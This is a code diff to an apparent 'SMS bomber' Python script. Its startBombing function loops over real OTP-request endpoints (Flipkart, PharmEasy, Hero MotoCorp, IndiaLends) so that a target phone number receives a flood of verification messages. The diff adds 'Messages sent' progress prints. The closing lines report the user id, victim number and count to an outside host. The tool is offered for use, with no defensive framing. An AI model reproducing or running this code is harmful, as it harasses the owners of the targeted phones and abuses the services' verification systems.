@@ -85,6 +85,7 @@ def startBombing(pn,cc,n,un):
 
         response = requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data)
         i-=1
+        print("[+]",n-i," Messages sent")
         if i<=0:
             break
         time.sleep(2)
@@ -102,6 +103,7 @@ def startBombing(pn,cc,n,un):
         data = {"contactNumber":pn}
         response = requests.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data)
         i-=1
+        print("[+]",n-i," Messages sent")
         if i<=0:
             break
         time.sleep(2)
@@ -135,6 +137,7 @@ def startBombing(pn,cc,n,un):
 
         response = requests.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data)
         i-=1
+        print("[+]",n-i," Messages sent")
         if i<=0:
             break
         time.sleep(2)
@@ -180,6 +183,7 @@ def startBombing(pn,cc,n,un):
                   }
         response = requests.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, cookies=cookies, data=data)
         i-=1
+        print("[+]",n-i," Messages sent")
     u=getUserDetails(un)
     request_string="http://ogbomber.rf.gd/insertBomb.php?id="+u["uid"]+"&pn="+pn+"&n="+str(n)
     driver.get(request_string)
